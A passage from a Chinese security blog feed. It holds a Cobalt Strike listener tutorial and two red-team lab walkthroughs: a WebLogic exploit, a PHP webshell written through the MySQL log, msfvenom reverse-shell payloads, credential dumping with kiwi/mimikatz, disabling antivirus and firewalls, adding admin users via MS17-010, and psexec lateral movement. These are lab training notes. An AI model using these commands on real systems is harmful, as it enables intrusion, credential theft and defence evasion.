Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212132790.png"></p><p>测试一下http监听器，用刚才的监听器生成一个钓鱼链接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212146999.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212300319.png"></p><p>将生成的payload放入windows中运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212307393.png"></p><p>成功上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212308113.png"></p><p>HTTPS和HTTP一样，不同的是HTTPS需要一个SSL证书具体如何配置可以参考：<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p><h2 id="DNS-Beacon"><a href="#DNS-Beacon" class="headerlink" title="DNS Beacon"></a>DNS Beacon</h2><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p><p>因为没有多余的域名，所以不演示</p><h2 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h2><p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。</p><p>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p><p><img src="https://cdn.jsdelivr.net/gh/JOHN-FROD/PicGo/blog-img/20220212105842.png" alt="img"></p><p>新建SMB监听器</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221643881.png" style="zoom:50%;" /><p>派生会话到SMB监听器</p><p>右键-&gt;新建会话-&gt;选择smb监听器 或者使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn SMB</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221645118.png"></p><p>等待一会，就可以看到SMB Beacon，在external可以看到∞∞字符</p><p>此时SMB Beacon通过父级的HTTP Beacon与CS服务器进行通信，而SMB Beacon与HTTP Beacon通过SMB协议进行通信。</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221649191.png"></p><p>将SMB Beacon插入系统进程</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221652561.png"></p><p>注入到system权限的系统进程，返回的会话则是system权限，管理器权限带*👌🏻</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221653011.png"></p><p>此时如果想断开某个会话的连接，可以使用unlink命令，比如如果想断开192.168.175.144，就可以在Beacon中输入<code>unlink 10.10.10.80</code></p><p>如果想再次连上，就直接输入<code>link </code>10.10.10.80，想从当前主机连到其他主机也可以使用此命令。</p><p>在进程中注入SMB Beacon后，便能看到process为vmtoolsed.exe的派生SMB Beacon。</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221654922.png"></p><h2 id="TCP-Beacon"><a href="#TCP-Beacon" class="headerlink" title="TCP Beacon"></a>TCP Beacon</h2><p>TCP Beacon与SMB Beacon类似，区别在于这里使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量是不加密的。</p><p>新建TCP Beacon</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221657163.png" style="zoom:50%;" /><p>使用方法和上面一致</p><h2 id="Foreign-Beacon"><a href="#Foreign-Beacon" class="headerlink" title="Foreign Beacon"></a>Foreign Beacon</h2><p>使用Cobalt Strike外部监听器可以派生给msf的meterpreter会话，这里有Foreign HTTP和Foreign HTTPS两种监听器，其中Foreign HTTPS的流量是加密的。</p><p>msf先起一个监听，msf的payload只能使用http方式，因为cs的监听器只支持http和https</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.118</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221712096.png"></p><p>CS配置一个Foreign HTTP，要与msf的端口、ip、payload一致</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221709422.png"></p><p>spawn msf 派生给msf，msf会收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221923888.png"></p><p>不知道为什么没有复现成功</p><p>msf派生会话给cs</p><p>生成监听器</p><p> <img src="https://raw.githubusercontent.com/chencicici/images/main/202207221929827.png"></p><p>msf派生会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span>   <span class="comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true</span></span><br><span class="line"><span class="built_in">set</span> lhost x.x.x.x               <span class="comment">#cobaltstrike监听的ip</span></span><br><span class="line"><span class="built_in">set</span> lport 6789                 <span class="comment">#cobaltstrike监听的端口 </span></span><br><span class="line"><span class="built_in">set</span> session 1                   <span class="comment">#这里是获得的session的id</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207221935284.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;基本使用&quot;&gt;&lt;a href=&quot;#基本使用&quot; class=&quot;headerlink&quot; title=&quot;基本使用&quot;&gt;&lt;/a&gt;基本使用&lt;/h1&gt;&lt;p&gt;Cobalt Strike使用C&amp;#x2F;S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互。&lt;/p&gt;
&lt;h2 id=&quot;启动服务端&quot;&gt;&lt;a href=&quot;#启动服务端&quot; class=&quot;headerlink&quot; title=&quot;启动服务端&quot;&gt;&lt;/a&gt;启动服务端&lt;/h2&gt;&lt;p&gt;服务端一般设在公网ip的服务器上&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ./teamserver your_ip your_passowrd [config_file]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./teamserver 192.168.31.118 123456&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="cs" scheme="https://syst1m.top/tags/cs/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队实战靶场02</title>
    <link href="https://syst1m.top/2022/07/18/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA02/"/>
    <id>https://syst1m.top/2022/07/18/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA02/</id>
    <published>2022-07-18T10:04:35.000Z</published>
    <updated>2022-07-21T13:28:17.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191524897.png"></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><code>WEB初始密码错误，需要使用administrator登录，密码为空</code></p><table><thead><tr><th>虚拟机</th><th>网络模式</th><th>密码</th></tr></thead><tbody><tr><td>DC</td><td>net1仅主机：10.10.10.10</td><td>1qaz@WSX</td></tr><tr><td>PC</td><td>net1桥接复制物理网络：192.168.31.189   net2仅主机：10.10.10.201</td><td>1qaz@WSX</td></tr><tr><td>WEB</td><td>net1桥接复制物理网络：192.168.31.18     net2仅主机：10.10.10.80</td><td>administra&#x2F;空</td></tr><tr><td>Kali</td><td>net1桥接复制物理网络：192.168.31.118</td><td></td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191620529.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191620506.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191621606.png"></p><p>开启weblogic服务在C:\Oracle\Middleware\user_projects\domains\base_domain\bin下以管理员运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191626843.png"></p><h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现根本ping不通</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191629862.png" style="zoom:50%;" /><p>采用半开放式方式扫描</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191642494.png" style="zoom:50%;" /><p>开放135存在smb服务，445可能存在ms17_010,3389是远程可能存在弱口令，7001weblogic可能存在命令执行</p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>使用工具检测出存在CVE-2020-2551</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191648372.png"></p><p>本来想使用工具直接上传webshell，但是上传成功后蚁剑一直连接不上，怀疑是被杀软阻止了</p><p>重新使用msf生成payload上传jspshell</p><p>上传路径<code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\1.jsp</code></p><p>访问路径<code>http://192.168.31.18:7001/console/framework/skins/wlsconsole/images/1.jsp</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191803812.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191801883.png"></p><p>kali监听返回一个会话，自带提权失败，应该是被杀软拦截了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191804270.png"></p><p>发现存在360，很多操作被拦截</p><p>![image-20220719181132987](&#x2F;Users&#x2F;chenci&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220719181132987.png)</p><p><code>ps</code>继续查看进程,发现系统进程services.exe</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191824277.png"></p><p>将我们msf后门的进程迁移至这个进程，拿到system权限</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191825675.png" style="zoom:50%;" /><p>关闭360</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191836792.png" style="zoom:50%;" /><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查看域名 net config workstation</span><br><span class="line">查看有几个域  net view /domain</span><br><span class="line">查看域内主机  net view</span><br><span class="line">查询域内用户   net user /domain <span class="comment">#该命令在本环境中需要在system权限下执行</span></span><br><span class="line">查看域管理员   net group <span class="string">&quot;domain admins&quot;</span> /domain  </span><br><span class="line">查看域控    net group <span class="string">&quot;domain controllers&quot;</span> /domain  </span><br><span class="line">关闭防火墙netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p>判断是否存在域</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191833680.png" style="zoom:50%;" /><p>发现还有一个网段，域控一般是本机的dns地址</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191841223.png"></p><p>也可以通过msf来定位</p><p><code>run post/windows/gather/enum_domain 查看域控</code></p><p><code>run post/windows/gather/enum_ad_computers查看域内成员</code></p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191846946.png" style="zoom:50%;" /><h2 id="横向打点"><a href="#横向打点" class="headerlink" title="横向打点"></a>横向打点</h2><p><code>run post/multi/manage/autoroute 新建路由</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191856195.png"></p><p><code>run autoroute -p 查看路由</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191858908.png"></p><p>background挂起会话，添加route只能使用msf自带的工具，要使用别的，还需要反向代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191905070.png"></p><p><code>vim /etc/proxychains4.conf 添加代理</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191908336.png"></p><p>测试代理是否可用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207192015948.png"></p><p><code>post/windows/gather/arp_scanner 扫描存活主机</code></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207192017651.png"></p><p>使用kiwi抓取密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207191920816.png"></p><p>生成payload上线cs，使用svc提升至system权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207201912329.png"></p><h2 id="PsExec传递"><a href="#PsExec传递" class="headerlink" title="PsExec传递"></a>PsExec传递</h2><p>使用现在这台主机中转一个监听器，利用psexec横向移动至DC，DC成功上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207201917397.png"></p><p>还剩一台pc也是一样的打法</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;拓扑图&quot;&gt;&lt;a href=&quot;#拓扑图&quot; class=&quot;headerlink&quot; title=&quot;拓扑图&quot;&gt;&lt;/a&gt;拓扑图&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207191524897.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;&lt;code&gt;WEB初始密码错误，需要使用administrator登录，密码为空&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;虚拟机&lt;/th&gt;
&lt;th&gt;网络模式&lt;/th&gt;
&lt;th&gt;密码&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;DC&lt;/td&gt;
&lt;td&gt;net1仅主机：10.10.10.10&lt;/td&gt;
&lt;td&gt;1qaz@WSX&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PC&lt;/td&gt;
&lt;td&gt;net1桥接复制物理网络：192.168.31.189   net2仅主机：10.10.10.201&lt;/td&gt;
&lt;td&gt;1qaz@WSX&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WEB&lt;/td&gt;
&lt;td&gt;net1桥接复制物理网络：192.168.31.18     net2仅主机：10.10.10.80&lt;/td&gt;
&lt;td&gt;administra&amp;#x2F;空&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Kali&lt;/td&gt;
&lt;td&gt;net1桥接复制物理网络：192.168.31.118&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队实战靶场01</title>
    <link href="https://syst1m.top/2022/07/17/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/"/>
    <id>https://syst1m.top/2022/07/17/ATT&amp;CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA01/</id>
    <published>2022-07-17T06:44:33.000Z</published>
    <updated>2022-07-17T09:47:58.988Z</updated>
    
    <content type="html"><![CDATA[<h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png"></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>三台机器，解压使用vm打开，默认密码hongrisec@2019</p><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>win7增加一块网卡,设置为桥接模式,用来连通攻击机.仅主机用来连通内网的两台靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171452480.png"></p><h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p>win7 net1桥接 外网192.168.31.183 net2仅主机 内网:192.168.52.143<br>win2003 net1仅主机 内网:192.168.52.141<br>win2003 net1仅主机 内网:192.168.52.138</p><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><p>kali net1桥接 外网:192.168.31.118</p><h2 id="开启web环境"><a href="#开启web环境" class="headerlink" title="开启web环境"></a>开启web环境</h2><p>在win7启动phpstudy</p><h1 id="外网突破"><a href="#外网突破" class="headerlink" title="外网突破"></a>外网突破</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali扫一下网段,确认靶机ip<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171513229.png"></p><p>访问是一个php探针<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171511761.png"></p><p>接着扫一下目录,存在phpmyadmin<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171517733.png"></p><p>弱密码登录成功 root root<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171519266.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>尝试通过文件写马,但是–secure0file-priv被写死<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171525433.png"></p><p>继续尝试日志写马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure><p>发现日志功能关闭,但是我们可以通过mysql命令开启,并保存修改路径存到我们指定的目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171529236.png"></p><p>开启日志并修改保存路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;</span><br><span class="line">set global general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171533073.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171534976.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171534585.png"></p><p>查询一句话木马,利用日志写入shell.php中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171536904.png"></p><p>蚁剑连接<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171537195.png"></p><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p><code>whoami</code>查看当前用户为管理员<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171540344.png"></p><p><code>ipconfig</code> 发现还存在一个网段<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171541043.png"></p><p><code>net config Workstation</code> 查看当前计算机名称,用户名等详细信息<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171543492.png"></p><p><code>net localgroup administrators</code> 查看其他管理员<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171543392.png"></p><p><code>systeminfo</code> 查看系统信息,发现打了4个补丁,当前域为god.org,域服务器名OWA<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171545007.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>由于win7启动了安全模式,所以无法直接反弹shell,用msf生成一个木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.118 LPORT=4444 -f exe -o msf.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.118</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171558828.png"></p><p>提升为system权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171601565.png"></p><p>ps：mimikatz模块已经合并为kiwi模块</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">ls<span class="built_in">a_dump</span>_sam：dump出lsa的SAM</span><br><span class="line">ls<span class="built_in">a_dump</span>_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抓取密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171613114.png"></p><h1 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看安装的软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171616956.png"></p><p>查看路由,发现还存在另一个网段192.168.52.0&#x2F;24</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171618532.png"></p><p>添加路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24添加录路由；</span><br><span class="line">run autoroute -p查看路由；</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171621412.png"></p><p>设置代理访问内网<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171652380.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvhost 192.168.2.129</span><br><span class="line"><span class="built_in">set</span> srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>配置代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171653857.png"></p><p>测试<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171719877.png"></p><p>探测内网存活主机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171706996.png"></p><p>用nmap扫描却扫不出来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171720554.png"></p><p>刚刚拿下的win7是存在nmap的,用它扫描.进入kali刚刚反弹的会话,蚁剑不是交互式shell看不到返回<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171727686.png"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><p>两台主机都存在445 和 135 端口,说明存在smb服务<br>尝试ms17_010,发现打不了<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171731292.png"></p><p>再次尝试ms17_010_command,成功执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171733335.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net user hack 8888! /add添加用户；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net localgroup administrators hack /add添加管理员权限；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span>执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span> /关闭防火墙</span><br></pre></td></tr></table></figure><p>win2003也是一样的打法不再赘述</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;拓扑图&quot;&gt;&lt;a href=&quot;#拓扑图&quot; class=&quot;headerlink&quot; title=&quot;拓扑图&quot;&gt;&lt;/a&gt;拓扑图&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;三台机器，解压使用vm打开，默认密码hongrisec@2019&lt;/p&gt;
&lt;h1 id=&quot;网络配置&quot;&gt;&lt;a href=&quot;#网络配置&quot; class=&quot;headerlink&quot; title=&quot;网络配置&quot;&gt;&lt;/a&gt;网络配置&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>hackable-3打靶</title>
